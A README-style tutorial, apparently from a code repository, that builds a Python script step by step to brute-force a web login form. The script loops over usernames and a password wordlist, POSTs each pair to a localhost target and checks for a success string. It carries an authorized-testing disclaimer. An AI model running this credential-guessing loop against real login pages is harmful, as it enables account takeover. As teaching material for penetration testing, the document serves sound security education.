# Web-Login-Form-Brute-Forcing

## Disclaimer

_This script demonstrates a basic brute-force technique intended for educational purposes and authorized penetration testing only._ 

_**Unauthorized use of this script is illegal and unethical**._ 

_By using this script, you agree to the following:_

_- You have explicit permission to test the system in question._

_- You will not use this script against any system that you do not own or manage._

_- You understand the legal implications of unauthorized access and agree to take full responsibility for your actions._

_Always prioritize ethical practices in cybersecurity. If you're unsure about the legality of your actions, please consult with a legal professional._

<br>

### Note:
_A web application you are authorised to test is required to test this script._

<br>

## Screenshots:

![Screenshot 2024-11-04 134617](https://github.com/user-attachments/assets/80a9b5cb-b11e-4fea-a3ec-cee6aea14fe7)

<br>

## Steps on how to perform Password Brute Forcing on a Login Page is as follows:

#### Step 1: Import required libraries
    import requests
    import sys

<br>

#### Step 2: Set up target URL and parameters
    target = "http://127.0.0.1:5000"
    usernames = ["admin", "user", "test"]
    passwords = "top-1oo-list.txt"
    needle = "Welcome Back"

<br>

#### Step 3: Create a loop to iterate through usernames
    for username in usernames:

<br>

#### Step 4: Open and read the password file
    with open(passwords, "r") as passwords_list:

<br>

#### Step 5: Create a nested loop to iterate through passwords    
    for password in passwords_list:
          password = password.strip("\n").encode()

<br>

#### Step 6: Display current attempt
    sys.stdout.write("[X] Attempting user:password -> {}:{}\r".format(username, password.decode()))
                sys.stdout.flush()
<br>

#### Step 7: Send POST request to the target URL
    r = requests.post(target, data={"username": username, "password": password})

<br>

#### Step 8: Check if login was successful
    if needle.encode() in r.content:
                    sys.stdout.write("\n")
                    sys.stdout.write("\t[>>>>>>] Valid Password '{}' found for user '{}'!".format(password.decode(), username))
                    sys.exit()
<br>

#### Step 9: Handle case when no password is found:
    sys.stdout.flush()
            sys.stdout.write("\n")
            sys.stdout.write("\tNo Password Found for '{}'!".format(username))
            sys.stdout.write("\n")
<br>
<hr>
